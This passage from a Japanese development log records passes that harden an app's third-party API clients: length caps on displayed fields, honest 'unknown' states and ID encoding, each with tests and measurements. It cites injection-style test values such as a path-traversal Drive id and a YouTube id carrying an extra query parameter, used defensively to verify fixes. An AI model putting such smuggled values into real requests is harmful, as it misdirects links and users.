import が 2 → 4 になり、**判定の散文が「renderer が読むのは`parseJsonText` 1 つだけ」と述べていて偽になった**。数を直すだけでなく散文を実測へ書き直した (`displayField` は `null` を返さないので「no のあとの動作」を持たない)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 200 ms / heap 10.3 MB・FULL DCL 550 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **17 回目**でもあり、今回も再現しなかった)**)・**2026-09-22 パス 416 後の計測: 11,946,439 B / 3,358,958 B (両方 +18 B** —— 画面が「不明」と言うための `countText` 1 つ。`apiNumberOf` を読むのは main の youtube だけなので束からは落ちる。**パス 415 は文字列の葉を測ったが、数の葉は測っていなかった。** 同じ 2 段の測り方 (① 全 76 画面に壊れた数を入れる ② 網の口を持つ client は**実物を通す**) でやり直した。①の実測は **14 画面 / 45 形**で膨らむか投げるが、**②で実物を通って画面へ届くのは 1 件だけ**だった:

| 相手の `statistics.subscriberCount` | 直す前 | 直した後 |
| --- | --- | --- |
| `"12500"` | 12,500 | 12,500 |
| `NaN` / `"abc"` / `{}` | **画面に `NaN`** | 「不明」 |
| `null` / `""` / `[]` | **`0`** (「登録者 0 人」という事実の主張) | 「不明」 |

★ **`Number(x ?? 0)` は 2 つの誤りを同時に持っていた** —— 読めない値を `NaN` にして画面へ出し、**欠けた値を `0` にして事実として主張する** (法則 `blank-states-its-reason`)。YouTube Data API は統計を **10 進の文字列**で返すので `finiteNumberOf` (数だけを受ける) では読めず、`shared/apiResponse.ts` に `apiNumberOf` を 1 つ置いた。★ **`shared/readNumeric.ts` とは揃えない** —— あちらは**利用者が打つ欄**を読む (全角・カンマ・単位語)。実測で `readNumeric('１２３')` は 123・`apiNumberOf('１２３')` は `null` で、**母集団が違う**ので受理集合も違うのが正しい (パス 410 が `shared/num.ts` の `finiteOrNull` について下したのと同じ判断・検査に 1 件として留めた)。★ **他の 5 client は実物を通すと届かなかった (測った)** —— github は `requireNumber` が 4 形すべてを断り (パス 262)、base / canva / freee は `finiteNumberOf` ほかの門が在る (パス 410)。★ **`1e308` は直さないと決めた (測って、理由を書いた)** —— 有限なので「読めた数」で、`1e+308` と刷るほうが 0 へ倒すより正直である (パス 408 が Ollama のモデルの大きさについて下したのと同じ判断)。実測で github / base / cursor の 3 画面が `e+308` を出すが、それは**壊れて見える**側である。★ **ローカルの画面 4 枚は母集団ではない** —— ①の走査では `business` / `linux` / `templates` / `kpi` / `charts` / `funding` / `talent` も膨らむ (`string-number` で `toFixed is not a function` と投げる物が 4 つ) が、値の出どころは利用者の記録・システム情報・見本で**第三者ではない**。**測って、母集団から外した理由を書いた**。検査は `renderer/pages/__tests__/thirdPartyNumberOnScreen.test.ts` (**10 件**) で、背骨は**振る舞い** —— 実物の client に 6 形を食わせて画面を描き、「不明」が出て `NaN` も素の `0` も出ないことを見る。★ **パス 410 の census が設計どおり働いた** —— 新しい nullable 欄 3 つを見つけて「型の照合を書け」と落ちた (台帳 20 → **23 欄**・床 16 → 19)。対照 **5 方向すべて鳴る** (A `Number(x ?? 0)` へ戻す ❌6 / B `apiNumberOf` が文字列を何でも通す ❌2 / C 画面が 0 へ倒す ❌6 / **D 見本の型を狭める ❌0 (vitest) · `TS2344` (typecheck)** / E 台帳から 1 行消す ❌1・復帰後 ❌0)。★ **自戒: 対照 D は vitest では鳴らない** —— `sameWidth<SameNullability<…>>` は**型の主張**で、vitest は型を剥がすので当たらない。`npm run typecheck` が `Type 'false' does not satisfy the constraint 'true'` と鳴らす。**鳴らない対照は報せ**なので、当てる先が typecheck であることを測って記録した (パス 373 / 402 / 404 と同じ罠の 4 度目だが、今回は**対照の側**で踏んだ)。★ **ゲートが 2 つ捕まえた**: ① `lint:zero-fold` の生成ブロック (`?? 0` が 3 件消えて 280 → **277**・script を引数無しで走らせて再生成) ② `lint:shared-judgement` の census —— `apiNumberOf` を足したので `apiResponse` が母集団に入り「判定を書け」と鳴った。**実測して「対称」と書いた** (renderer がこのモジュールから直接読むのは `parseJsonText` 1 つだけで、それは `null` を返さず投げる。`null` を返す読み手に両ビルドが届く道は `shared/api/*.ts` ただ 1 つ)。`typecheck` 緑・`npm test` **835 / 18,337**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15351 → **15356**・否定で答えられる 37 → **38** へ)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 217 ms / heap 10.3 MB・FULL DCL 592 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **19 回目**でもあり、今回も再現しなかった))・****2026-09-22 パス 415 後も 11,946,421 B / 3,358,940 B で byte 単位で不変** (★ **ただし中身は変わっている** —— md5 は `4ffe8e97…` → `b69893df…`。共有の `shared/api/cursor.ts` で `?? ''` を `displayField(…)` へ替えた 7 欄が、最小化後に**たまたま同じ長さ**になった。残る 10 client は main なので束から落ちる。**「size が同じ」と「同じ物」は別である** —— 両方を組んで md5 まで見た。**4 パス続けて人が 1 画面ずつ見つけていた家系を、面の側から一斉に測る機械にした。** パス 408 / 411 / 413 / 414 は ollama → cloudflare + github → ms365 + youtube → 書き込みの結果、と**毎回 grep で 1〜2 枚ずつ**見つけていた。不変条件は 1 つ —— **相手が 1 欄に 200,000 字を返しても、画面はその範囲に収まる**。実測 (2026-09-22 ・ 実物の client に 200,000 字を食わせて画面を描く):

| 画面 | 直す前 | 直した後 |
| --- | ---: | ---: |
| **atlassian** | **800,279 字** | 1,307 |
| **gmail** | **401,170** | 1,647 |
| **calendar** | **400,946** | 1,451 |
| **drive** | **400,909** | 1,423 |
| **slack** | **400,313** | 790 |
| **cursor** (両ビルド) | **+399,791** | 1 欄 257 |
| **freee** | **200,315** | 572 |
| **wordpress** | **200,291** | 548 |
| **canva** | **200,181** | 438 |
| **notion** | **200,089** | 346 |
| **base** | **200,050** | 307 |

★ **atlassian はパス 409 / 413 / 414 が 3 度続けて「振る舞いで確かめていない」と残していた所**で、理由はどれも「資格情報の関門に先に当たる」だった。実際に `parseAtlassianToken` が要るのは `{email, token, site}` の JSON と **`https://` で始まる site** だけで、**私の見本がスキームを落としていた**。**測れなかったのではなく、当てていなかった** —— パス 397 / 399 / 403 / 404 で 4 度書いた自戒の 5 度目である。だから機械には **`landed` の主張**を入れた (相手の行が画面に届いていなければ「短い画面」は天井のおかげではない・対照 H がそれを撃つ)。★ **cursor だけは `shared/api/cursor.ts`** なので**両ビルドが読む** —— 天井もそこに 1 つ置けば済む (main の 10 本は `main/clients/`)。★ **見つけ方は 2 段** —— ① `SERVICES` を回して**全 76 画面**に「文字列の葉を全部長くした見本」を食わせ、膨らむ画面を数える (実測 21 画面) ② そのうち**網の口を持つ client** について、**実物の client を通して**同じことをする。①だけでは「画面に天井が無い」しか言えない (天井は client の境界に在るので、それは設計どおり) —— **直すべき所を決めるのは②である**。★ **針の母集団を広げた所で 3 本増えた** —— `jsonFetch` だけを数えると `ollama.ts` (自前の `fetchFn`)・`business.ts` / `kpi.ts` (注入された `fetch()` メソッド) が落ちる。パス 412 と同じ家系で、**今回は publish する前に気付けた**。広い針 + **理由つきの分類**にした (拾いすぎて人が理由を書く側へ倒す)。★ **正直に言う: 答えが変わる入力が在る** —— 正常な応答の答えは 1 つも変わらないが、① 256 字を超える欄は `…` で切られる ② `summary: ''` / `title: ''` の予定・デザインが `（タイトルなし）` / `(無題のデザイン)` を出すようになる (`x ?? 既定` から `displayField(x) || 既定` へ替えたため)。後者は**空欄より理由を述べる側**なので意図した変更である。検査は `renderer/pages/__tests__/thirdPartyScreenCeiling.test.ts` (**16 件**) で、背骨は**振る舞い** (11 client を実物で掃く) + **母集団の両方向** (網の口を持つ **23 本**が `swept-here` / `swept-elsewhere` (名指しの検査が名指しの漏斗を読む) / 理由つきの除外 のどれかに在る)。対照 **8 方向すべて鳴り、それぞれ狙った検査に当たる** (A 天井そのものを外す ❌11 / B atlassian を素へ ❌1 / C calendar を素へ ❌1 / D cursor を素へ ❌1 / E 台帳から 1 行消す ❌1 / F 針を `jsonFetch` だけに狭める ❌1 (**パス 412 の死角をそのまま再現する**) / G `swept-here` を `swept-elsewhere` へ ❌2 / H 見本を的から外す ❌1 (**3 パス続けた見落としをそのまま再現する**)・復帰後 ❌0)。`typecheck` 緑・`npm test` **834 / 18,327**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15345 → **15351** へ —— **今回も予想せず門に訊いた**)。**出荷物の中身が動いたので実機も回した**: `perf` OK (LITE DCL 208 ms / heap 10.3 MB・FULL DCL 568 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **18 回目**でもあり、今回も再現しなかった))・****2026-09-22 パス 414 後の計測: 11,946,421 B / 3,358,940 B (両方 +245 B** —— 書き込みの結果の欄 17 件に天井を通し、作成された予定の読みを両ビルドで 1 つにし、Drive のフォルダ URL を符号化した分。`shared/api/` は両ビルドが読むので LITE も同じだけ増える。**書き込みの結果が画面に素で載り、Canva で画面が 400,451 字になっていた。** **見つけ方**: パス 411 / 413 が閉じたのは**読み取り** (`fetchSnapshot`) の側で、残っていた母集団は**書き込みの結果**だった。実物の action handler に 200,000 字を 1 欄ぶん食わせ、**画面のボタンを実際に押して**測った。実測 (2026-09-22 ・ 直す前 → 直した後):

| 画面 | 操作 | 直す前 | 直した後 |
| --- | --- | ---: | ---: |
| **Canva** | フォルダ作成 | **400,451 字** | 965 字 |
| **GitHub** | Issue を作成 | **200,338 字** | 595 字 |
| Cloudflare | DNS レコード作成 | `name` / `type` 各 200,000 | 各 257 |
| Drive | フォルダ作成 | `name` 200,000 | 257 |

★ **型は 2026-09-14 (パス 262) から `requireString` で見ていたので投げない** —— 空いていたのは**長さだけ**だった。**型を見ていることは天井が在ることではない** (法則 `mention-vs-declaration` の、この家系での現れ)。漏斗はパス 321 が両ビルドで 1 つにした `shared/api/*.ts` の `parseCreated*` なので、**11 本のうち該当する欄を全部そこで通す**。★ **URL の欄には天井を通さない** —— 256 字で切った URL は**別の頁を指す**ので、切るより型で落とすほうが正しい (外側の関門は `externalUrlOrNull`)。その **6 欄**は理由つきの台帳に載り、**両方向**なので天井を通した日にも「台帳から消せ」と鳴る。★ **2 つ目: `microsoft-365/create-event` だけが両ビルドで答えが違った** —— `shared/api/microsoft365.ts` は「欄の判定 (`checkEvent`) → 要求の組み立て (`graphEventInit`)」まで 1 つに揃えてあったのに、**3 つ目 (応答の読み) だけが 2 つ在った**。実測 (直す前・実物の handler に食わせる):

| 応答 | ブラウザ版 | **デスクトップ版** |
| --- | --- | --- |
| `{subject: {a:1}}` | `optionalString` が落とす | **物がそのまま** |
| `{webLink: 42}` | 落とす | **数がそのまま** |
| `{}` (id 無し) | `requireString` が投げる | **`id=undefined` で「作成しました」** |

**今日この違いは画面に出ない** (`Microsoft365Page` は `webLink` をリンクの宛先にするだけで `subject` を描かない) —— **罠であって生きた欠陥ではない**。それでも 1 つにするのは、パス 402 / 407 と同じ「**同じアプリが同じ問いに 2 通り答え、弱い方が main に立っている**」形だからである。`parseCreatedGraphEvent` を置き、両ビルドがそこを通る。★ **3 つ目: `parseCreatedDriveFolder` の fallback URL が `${id}` を素で挿していた** —— 実測: `id = '../../../evil'` → 開く先は **`https://drive.google.com/evil`**・`'x?next=1'` → `…/folders/x?next=1`。**オリジンは固定なので別のサーバへは飛ばない** (起きるのは「押すと思っていない頁が開く」) が、`atlassianLinks.ts` の `jiraBrowseUrl` が 2026-09-12 (パス 181) から `encodeURIComponent` を通し、その docblock が「**動的部分は必ず `encodeURIComponent`**」と**規則として書いている** —— 4 か所目がここに在った。`lint:url-encoding` はこの母集団を**意図して**見ない (「画面に出すリンクは対象外」と自分の docblock で述べている) ので、機械は検査の側に置いた。**正当な答えは 1 つも変わらない** (Drive のファイル ID は `[A-Za-z0-9_-]+` で `encodeURIComponent` はどの字も書き換えない・実測)。検査は `shared/api/__tests__/createdResponseFields.test.ts` (**13 件**) と `renderer/pages/__tests__/actionResultCeiling.test.ts` (**4 件**・jsdom で実際に押す)・`microsoft-365.test.ts` に **4 件**。母集団は**走査で導く** —— `shared/api/*.ts` の `export function parse*` **12 本**を役目の台帳 (`created-response` / `own-input`) と両方向に突き合わせ、第三者の文字列の欄 **23 件**のうち天井を通らないのは URL の **6 件**だけであることを両方向で留める。対照 **8 方向すべて鳴り、それぞれ狙った検査に当たる** (A 天井そのものを外す ❌4 / B github の title を素へ ❌2 / C canva の 2 欄を素へ ❌3 / D main の ms365 を `??` へ戻す ❌5 / E drive の符号化をやめる ❌1 / F 天井なしの台帳から 1 行消す ❌1 / G 役目の台帳から 1 行消す ❌1 / H 針を 1 行の形だけに戻す ❌1・復帰後 ❌0)。★ **自戒: D は最初 ❌1 (綴りの照合) しか鳴らなかった** —— 振る舞いの主張を**共有の関数に直接**当てていたので、main を戻しても当たらなかった。実物の handler を呼ぶ 4 件を足して ❌5 に。**「対照が鳴った」ことと「振る舞いが測れている」ことは別**である。**閉じていない物 (測った)**: ① **200,000 字の URL** (`webLink` / `htmlLink`) はそのまま通る —— 画面に**文字としては出ない** (リンクの宛先だけ) ので今日は膨らまない。切るのは誤りなので、直すなら「長すぎる URL は落とす」側である ② shopify の 4 つの sync action の応答 (`ts` / `channel` / `url` / `pageId`) は型を見ていないが、**どの画面からも呼ばれていない** (実測: `ShopifyPage` は `record-entry` だけ・`ConnectorsPage` は別経路の `executeFreeConnector`) ③ `skills.ts:482` の `stopReason` は画面に読み手が **0 件**。`typecheck` 緑・`npm test` **833 / 18,311**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15324 → **15345** へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 197 ms / heap 10.3 MB・FULL DCL 544 ms / heap 36.8 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **17 回目**でもあり、今回も再現しなかった))・****2026-09-22 パス 413 後の計測: 11,946,176 B / 3,358,695 B (両方 +4 B** —— 画面が `dateText(` で包んだ分だけ (client 側の直しは main なので出荷物に入らない)。**Microsoft 365 の開始日時が 3 形で投げ、取得ごと失敗していた。** **見つけ方**: パス 411 の残作業 (`?? ''` の 9 欄) を辿ったら、**天井より先に「投げる」が残っていた**。実測 (2026-09-22 ・ 直す前):

| 壊し方 | 直す前 |
| --- | --- |
| `start.dateTime` が数 / 物 | **`((intermediate value) ?? "").slice is not a function`** |
| `start.dateTime` が配列 | **`… .slice(...).replace is not a function`** |
| ms365 の 5 欄に 200,000 字 | 画面の総文字数 **1,001,057** |
| youtube の 3 欄に 200,000 字 | 画面の総文字数 **400,067** |
| youtube の `videoId` が `a&list=EVIL` | URL は **`?v=a&list=EVIL`** (別の query を注ぎ足せる) |

★ **パス 410 は同じファイルの `received` を直し、`start` は残した** —— 隣の欄が直り、この欄だけ前提を持たないまま在る形 (パス 398 / 408 と同じ非対称)。**投げるほうは Microsoft 365 の取得が丸ごと失敗する**。★ **`displayDateOf` は使わない (理由を実物に書いた)** —— Graph の `dateTime` は `2026-01-01T10:00:00.0000000` のように**時間帯を持たない現地時刻**で (時間帯は隣の `timeZone` 欄)、`parseTimestamp` に通すと環境の時間帯で解釈し直してしまう。**読める値の答えを変えない**ために型だけ検める (`eventStart`)。★ **youtube は同じファイルが要求の URL 3 本を既に符号化していた** (73 / 74 / 88 行) —— **表示の URL だけが素**だった (ホストは youtube.com のままなので越境はしないが、`&` で別の query を注げる)。**直し**: ① `eventStart` (型を見て読めなければ `null`) ② `displayField` を **8 欄** (ms365 の userName / subject×2 / from / location・youtube の channel title / video title / publishedAt) ③ `encodeURIComponent` ④ **見本の型を client と同じ幅へ**広げ、画面が `dateText` で理由を言う (直す前は `filter(Boolean)` で黙って落ちていた)。★ **読める値の答えは 1 つも変わらない** (実測: `2026-01-01 10:00`・`ちゃんねる`・`watch?v=v1` はそのまま)。検査は `renderer/pages/__tests__/ms365AndYoutubeFields.test.ts` (**7 件**) で、背骨は**振る舞い** —— 実物の client / builder に食わせて画面を描き、投げないこと・総文字数が 20,000 未満であることを見る。対照 **7 方向すべて鳴り、それぞれ狙った検査に当たる** (復帰後 ❌0)。★ **ゲートが 3 つ捕まえた**: ① **パス 410 の census** が新しい nullable 欄を見つけて「型の照合を書け」と落ちた (**設計どおりに働いた**・台帳 19 → **20 欄**) ② `microsoft-365.test.ts` が `start: ''` を仕様として留めていた (`null` + 理由へ直した・法則 `no-weakness-as-spec`) ③ `verify:arch` の参照が漂流 (`microsoft-365.ts:17-250` → `17-300`)。`typecheck` 緑・`npm test` **831 / 18,290**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15317 → **15324** へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 216 ms / heap 10.3 MB・FULL DCL 608 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **16 回目**でもあり、今回も再現しなかった))・**2026-09-22 パス 412 後も 11,946,172 B / 3,358,691 B で byte 単位で不変** (直したのは `src/main/clients/{youtube,gmail,github}.ts` と検査 1 本だけ —— **ブラウザ版はこの 3 つの main クライアントを 1 行も読み込まない**ので出荷物は動かない: **両方を組んで実測した**。**パス 409 の針が 2 つの形を見落としており、3 つのサービスが第三者の応答 1 件で取得ごと失敗していた。** **見つけ方**: パス 411 の残作業 (`?? ''` の 9 件) を辿って `youtube.ts` を読んだら、**`(pl.items ?? [])` の次の行に `.map(`** が在った —— パス 409 の census は「素の `(… ?? []).map(` は `main/clients/` に **0 件**」と主張しており、**その主張が偽だった**。実測 (2026-09-22 ・ 直す前・実物の client に食わせる):

| client | 壊し方 | 直す前 |
| --- | --- | --- |
| **youtube** | 要素が `null` | **`Cannot read properties of null (reading 'snippet')`** |
| **youtube** | `items` が文字列 / 数 | **`(pl.items ?? []).map is not a function`** |
| **gmail** | `payload.headers` が文字列 | **`headers.find is not a function`** |
| **gmail** | header の要素が `null` | **`Cannot read properties of null (reading 'name')`** |
| **gmail** | `h.name` が数 | **`h.name.toLowerCase is not a function`** |
| **github** | `search.items` が文字列 | **`items.map is not a function`** |
| **github** | 要素が `null` | **`Cannot read properties of null (reading 'number')`** |

★ **7 形とも `fetchSnapshot` ごと失敗する** ので、その画面には何も出ない (パス 409 と同じ重さ)。★ **なぜ census が見落としたか —— 針が `.test(line)` で 1 行ずつ当てていた**: ① `recentVideos = (pl.items ?? [])` 改行 `.map(…)` (youtube) ② `const items = search.items ?? [];` … `items.map(…)` (github / **gmail は パス 409 が一覧を直した当のファイル**) —— **どちらも母集団に入らなかった**。パス 334 / 369 / 375 / 411 と同じ家系 (**綴りの針は、綴りでない物に動かされる**) で、**今日 2 度目**である。**直し**: ① 3 本とも `objectRows` へ (gmail の `headerValue` は `h.name` / `h.value` の型も見る) ② **針を両方の形へ広げ、改行を跨げるようにする** (行番号は「その一致までの改行の数」で数えるので報告は素の行番号のまま) ③ **振る舞いの背骨を 3 本足す** —— 実物の client に 7 形を食わせて「投げない・良い行は残る」を見る。★ **免除は 1 件だけで、その理由そのものを検める** —— `shopify.ts:127` の `o.lineItems ?? []` は**画面が送る payload** で、`assertOrder` の `checkWriteFields` + `checkShopifyLineItems` (パス 282) を通ってからしか届かない (**第三者の応答ではない**)。`objectRows` を足すと型の上で死んだ枝になり等価変異の pragma が要る (パス 351 の形) ので、理由つきの台帳へ載せ、**`assertOrder` の中で関門が呼ばれていること**を別の `it` が見る (関門が外れた日にこの免除の理由は偽になるので、そのとき鳴る)。★ **読める値の答えは 1 つも変わらない** (実測: youtube の `v1`・gmail の `a@b`・github の PR #1 はそのまま)。対照 **7 方向すべて鳴り、それぞれ狙った検査に当たる** (A youtube を素へ ❌2 / B gmail を素へ ❌2 / C github を素へ ❌2 / D `objectRows` の選別をやめる ❌8 / E 免除の理由を壊す ❌3 / F 台帳の免除を消す ❌2 / **G 針を 1 行ずつへ戻す ❌1** —— **パス 409 の死角がそのまま再現する**・復帰後 ❌0)。★ **自戒: 検査ファイルの構造を 2 度壊し、2 度とも `Tests no tests` が出た** —— `export function` を `describe` の中へ入れて括弧が合わなくなった。**「検査が 0 件」は緑ではない** (パス 409 で同じことを書いた当のことを、また踏んだ)。**測って何も無かった軸も記録する**: `?? [];` の形は `main/clients/` に 4 件で、`security.ts:141` は**自分たちの定数**の引き (第三者ではない)。`typecheck` 緑・`npm test` **830 / 18,283**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15312 → **15317** へ —— **今回も予想せず門に訊いた**)。**実機は回していない** —— 出荷物が 1 byte も動いていないので (両方を組んで確かめた))・**2026-09-22 パス 411 後も 11,946,172 B / 3,358,691 B で byte 単位で不変** (直したのは `src/main/clients/{cloudflare,github}.ts` と `shared/apiResponse.ts` に足した 1 関数だけ —— **`displayField` を読むのはこの 2 つの main クライアントだけ**なので、ブラウザ版の束からは tree-shaking で丸ごと落ちる (`apiResponse.ts` 自体はブラウザ版も `shared/api/cursor.ts` 経由で読むので「入るかもしれない」側だったが、**両方を組んで +0 B / +0 B を実測した**)。**生の第三者文字列が meta 行に載り、1 行で画面が 1.4M 字になっていた。** **見つけ方**: パス 410 が残した母集団 (生の第三者文字列が `DataList` の meta 行に載る画面 2 枚) を、**実物の client に 200,000 字を 1 行ぶん食わせて描いて**測った。実測 (2026-09-22 ・ 直す前):

| 画面 | 素通りした欄 | 画面の総文字数 |
| --- | --- | ---: |
| **Cloudflare** | `name` / `status` / `plan` / `accountName` / `nameServers` ×2 | **1,400,077** |
| **GitHub** | `title` / `state` / `head` / `base` / 利用者の `name` / `company` | **1,400,096** |

★ **`DataList` は件数の天井 (`MAX_LIST_ITEMS` 2000) を持つが、1 件の長さの天井は持たない** —— だから 1 行で画面が 1.4M 字になる。パス 408 が Ollama のモデル一覧について閉じたのと**同じ形**で、そのときの直し (`modelDetail`・64 字) は `shared/ollama.ts` の私有だった —— **2 つ目・3 つ目の client が要ったので `shared/apiResponse.ts` へ出した** (法則 `center-then-count-callers`)。★ **相手は「乗っ取られた proxy」でありうる** —— ブラウザ版の Cloudflare は**利用者の BYO Worker を通る** (`assistantLimits.ts` が名指ししている脅威そのもの) し、**GitHub の PR タイトルとブランチ名はフォークから PR を開ける誰でも決められる欄**である。**直し**: `displayField(v, max = MAX_DISPLAY_FIELD_CHARS)` を 1 つ置き、11 欄を通す。① **型から始める** (`?? ''` は null / undefined しか受けないので数やオブジェクトは素通りしていた) ② **天井は 256 字**で、根拠は**相手の側が既に持っている上限** (GitHub の title / name / company は 255 字・git の ref は実用上 255 byte・DNS 名は 253 字) —— **正当な値はすべてここに収まる** ③ **切ったことは `…` で述べる** (パス 400) ④ **行ごとは落とさない** (欄が長いだけの zone や PR が一覧から消えるほうが悪い・パス 408 と同じ判断)。★ **読める値の答えは 1 つも変わらない** (実測: `example.com` / `main → main` はそのまま)。検査は `renderer/pages/__tests__/thirdPartyFieldCeiling.test.ts` (**14 件**) で、**背骨は振る舞い** —— 実物の client に 200,000 字を食わせて画面を描き、総文字数が 20,000 未満であることを見る。対照 **8 方向すべて鳴り、それぞれ狙った検査に当たる** (A cloudflare を素へ ❌3 / B nameServers の天井 ❌2 / C github の PR を素へ ❌1 / D github の利用者欄を素へ ❌2 / E 天井を持たない ❌4 / F 型を見ない ❌1 / G `…` を述べない ❌4 / H 台帳から 1 行消す ❌1・復帰後 ❌0)。★ **針を 2 度直し、2 度とも自分の台帳がその場で捕まえた**: ① 最初の針は `欄: displayField(` だけを見ており、`nameServers: optionalStringArray(…).map((ns) => displayField(ns))` という**複数行の式を見落とした** ② 括弧の深さを数える形に直したら今度は広すぎて、**親の欄** (`zones:` / `user:`) まで拾った —— 値が物のリテラルを開くならその中の `displayField(` は子の欄のものなので、**内側だけを数える**形にした (パス 334 / 369 / 375 と同じ家系: **綴りの針は、綴りでない物に動かされる**)。★ **台帳の限界を測って書いた** —— 対照 C を回すと**落ちたのは振る舞いの 1 件だけ**で名前の台帳は通った (同じ欄名が `fallback` の側にも在り、そちらは天井を通したままだから)。**2 か所のうち 1 か所が外れる形は名前の台帳では映らない** —— 映すのは画面の大きさを見る側である。**閉じていない物 (測った)**: `?? ''` だけで第三者の文字列を受ける欄が**まだ 9 件** (`microsoft-365` 4 / `shopify` 2 / `skills` 1 / `youtube` 2)。同じ測り方 (実物の client に 200,000 字) で 1 画面ずつ閉じられる。`typecheck` 緑・`npm test` **830 / 18,278**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15301 → **15312** へ —— **今回も予想せず門に訊いた**)。**実機は回していない** —— 出荷物が 1 byte も動いていないので (両方を組んで確かめた))・**2026-09-22 パス 410 後の計測: 11,946,172 B / 3,358,691 B (両方 +156 B** —— 第三者の値を読む口を 2 つ (`finiteNumberOf` / 画像 URL の関門の床) と、画面の断りの文 2 つを足した分。`shared/` と `renderer/` は両ビルドが読むので LITE も同じだけ増える。**画面が第三者の値にメソッドを呼び、1 欄の型違いで画面が丸ごと落ちていた。** **見つけ方**: パス 409 の残作業 (`?? ''` の 13 件・`slice(0, 10)` の 6 件) を数えて回るのをやめ、**画面を実際に壊して測った** —— 16 の network client の見本について各行の各欄を 1 つずつ壊し、76 画面を jsdom で描く。実測 (2026-09-22 ・ 直す前) は **8 欄 / 3 サービス**で、そのうち**実物の client を通して届くのは 2 つ**だった:

| 画面 | 相手の応答 | 直す前 |
| --- | --- | --- |
| **BASE** | `{"items":[{"item_id":1,"title":"商品A","visible":1}]}` | **`Cannot read properties of undefined (reading 'toLocaleString')`** —— 画面が丸ごと落ちる |
| **BASE** | `price: '1000'` (文字列) | 落ちないが **`¥1000`** —— 桁区切りの無い値を金額として刷る |
| **Canva** | `thumbnail: {url: 42}` | **`url.replace is not a function`** —— 画面が丸ごと落ちる |
| cursor 6 欄 | `undefined` / 文字列 | **罠であって生きた欠陥ではない** (`readNum` が正規化する・両ビルドとも `shared/api/cursor.ts` を通ることを読み手の一覧で確かめた) |

★ **いちばん重いのは Canva で、投げていたのは関門そのものだった** —— `safeImageSrc(url: string | undefined | null)` の `if (!url)` は**宣言の型を信じて**書かれていたが、ここへ来る値の大半は第三者の応答で、その型は `jsonFetch<T>` のキャストが作った見せかけである。実測で `safeImageSrc(42 / true / {} / [])` は **4 形とも投げ**、この関門は `DataList` の thumbnail と `StatusBar` の avatar、つまり**全 76 画面**の第三者画像 URL が通る 1 つである (`jpy` の docblock が「227 か所から呼ばれる唯一の funnel なので床はここに置く」と書いているのと同じ理由)。★ **見本が「型の出どころ」である** —— 画面は `useServiceData(id, SNAPSHOT[id])` で描くので `T` は client の宣言ではなく**見本のリテラル**から推論される。client が `price: number | null` に広げても見本が `6800` のままなら画面は `.toLocaleString()` を呼べてしまい、`npm run typecheck` も黙る。**写しが在るのには理由が在る** —— `snapshot.ts` は renderer に在り `main/clients/*` は main なので `lint:imports` の境界を越えて型を import できない (実測: 70 近い client が `*Snapshot` を export するのに `snapshot.ts` が import しているのは `CursorSnapshot` **1 つだけ**)。**直し**: ① 関門は**文字列であるところから始める** (`safeImageSrc` / `safeRemoteImageSrc` / `safeCssUrl` の引数を `unknown` にして `typeof` で落とす —— 型と実行時の門が互いを支え、対照 A では `tsc` 自身が `Property 'replace' does not exist on type '{}'` と鳴った) ② **境界で型を確かめる** (`base` の価格・在庫は `finiteNumberOf`、`canva` の thumbnail は `optionalString`) ③ **見本の型を client と同じ幅へ** ④ **画面が理由を名乗る** (「価格不明」「在庫不明」—— `¥0` / `在庫 0` は「無料」「売り切れ」という**事実の主張**になる · 法則 `blank-states-its-reason`) ⑤ 数の読み手は `shared/apiResponse.ts` の `finiteNumberOf` **1 つ**で、`shared/api/cursor.ts` の私有の `readNum` もそこへ寄せた (受理集合は同じ)。★ **`shared/num.ts` の `finiteOrNull` とは揃えない** —— 中身は同じ判定だが、あちらの引数は `number` で、**文字列を渡したら型エラーになるのが正しい**母集団 (自分たちが計算した数) を受ける。**同じ `shared/api/cursor.ts` が 2 つを使い分けており、この非対称は元から正しい** (パス 402 の「数の読み方は共有しない」と同じ判断)。★ **正直に言う: 答えが変わる入力が在る** —— 正常な応答の答えは 1 つも変わらないが、① 数でない価格・在庫は `null` になり画面が「価格不明」と言う (直す前は `¥1000` と刷っていた) ② 文字列でない画像 URL は描かれない (直す前は投げていた) ③ WordPress / Microsoft 365 の読めない日付は `''` ではなく `null` になり、画面が「日付が読めません」と言う。検査は `main/clients/__tests__/nullableSnapshotFieldWidth.test.ts` (**19 欄の両方向の台帳 + 型の照合**) と `renderer/pages/__tests__/thirdPartyFieldOnScreen.test.ts` (**実物の client に応答を食わせて画面を描く**・5 件)、`imageUrlGate.test.ts` に 3 件。★ **隣に同じ不変条件が 2026-09-14 から在った** —— `snapshotFieldWidth.test.ts` の 「見本の型は、実物の型より狭くてはならない」で、**母集団は真偽値 13 欄だけ**だった。真偽値が狭いと「起きない枝」ができる (煩わしい)。**`X | null` が狭いと画面が落ちる。** 対照 **7 方向すべて鳴り、それぞれ狙った検査に当たる**: A 関門の `typeof` を外す ❌2 + TS1 / B base が素の値を返す ❌2 / C canva が `?? ''` へ戻る ❌1 / D 画面が 0 を刷る ❌2 / E 台帳から 1 行消す ❌1 / F 台帳に無い nullable 欄を足す ❌1 / G `finiteNumberOf` が何でも通す ❌2 (復帰後 ❌0 も確かめた)。★ **自戒: 最初の針は構造の同一性を求めていて `devEnv.project` で落ちた** —— 実測すると見本は既に `| null` を持ち画面も `devEnv.project && (…)` で守っており、差は `readonly` の付き方だけだった。**製品ではなく針の誤り**で、見るべきは `null` の有無ただ 1 つである (`SameNullability`)。★ **ゲートが 2 